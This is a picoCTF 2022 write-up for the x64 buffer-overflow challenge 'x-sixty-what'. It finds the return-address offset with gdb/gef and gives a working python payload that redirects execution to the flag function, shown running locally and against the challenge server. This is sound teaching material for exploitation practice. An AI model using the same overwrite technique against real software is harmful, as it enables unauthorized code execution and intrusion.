# x-sixty-what
## Description
- **Tags**:
    - picoCTF 2022
    - Binary Exploitation
    - x64

- **Author**:
    - Sanjay C
    - LT 'Syreal' Jones

Overflow x64 code

Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this [program](https://artifacts.picoctf.net/c/193/vuln). [Download source](https://artifacts.picoctf.net/c/193/vuln.c).

```
nc saturn.picoctf.net 51487
```

## Exploration

Start by finding where we start to overflow. The biggest difference in x64 is that if a too large (*over simplificiation here) address attempts to overflow `$rip` that is blocked. This means that we need to search for our pattern in `$rsp` instead, given that it will be blocked from going into `$rip`.

```
$ gdb ./vuln.elf
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  r <<< aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
gef➤  pattern search $rsp
[+] Searching for '$rsp'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search)
```

Then we can find where the function we want to return to is:
```
gef➤  disas flag
Dump of assembler code for function flag:
   0x0000000000401236 <+0>:     endbr64
   0x000000000040123a <+4>:     push   rbp
   0x000000000040123b <+5>:     mov    rbp,rsp
   0x000000000040123e <+8>:     sub    rsp,0x50
   0x0000000000401242 <+12>:    lea    rsi,[rip+0xdbf]        # 0x402008
   0x0000000000401249 <+19>:    lea    rdi,[rip+0xdba]        # 0x40200a
   0x0000000000401250 <+26>:    call   0x401130 <fopen@plt>
...
```

Through some trial and error it is interesting that attempting to jump directly to the address of `flag()` does not work as expected. While debugging locally it is possible to see that the flag is correctly read into memory, however `printf()` fails in what appears to be some buffering internals. Taking the hints from the challenge, however, we can attempt to jump after the second (`push`) instruction and things work out...

```
$ python3 -c 'import sys; import struct; sys.stdout.buffer.write(b"A"*72 + struct.pack("<Q", 0x40123B))' | ./vuln.elf
Welcome to 64-bit. Give me a string that gets you the flag:
picoCTF{REDACTED}
Segmentation fault
```

Built out into a script and run on remote:
```
$ ./exploit_vuln.py saturn.picoctf.net 51487
picoCTF{REDACTED}
```